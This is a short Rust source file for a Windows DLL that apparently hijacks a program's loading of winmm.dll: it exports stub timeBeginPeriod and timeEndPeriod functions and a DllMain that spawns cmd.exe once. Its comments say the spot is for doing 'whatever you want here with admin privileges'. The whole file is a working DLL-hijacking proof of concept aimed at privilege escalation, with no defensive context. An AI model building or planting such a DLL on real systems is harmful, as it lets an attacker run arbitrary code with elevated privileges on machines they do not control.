use std::sync::atomic::{AtomicBool, Ordering};

static HAS_RUN: AtomicBool = AtomicBool::new(false);

#[no_mangle]
pub extern "C" fn DllMain() {
    if !HAS_RUN.swap(true, Ordering::Relaxed) {
        // do whatever you want here with admin privileges.
        // in this case, I just spawn a command prompt.
        std::process::Command::new("cmd.exe").spawn().unwrap();
    }
}

#[no_mangle]
pub extern "C" fn timeBeginPeriod() {
    // do nothing
}

#[no_mangle]
pub extern "C" fn timeEndPeriod() {
    // do nothing
}
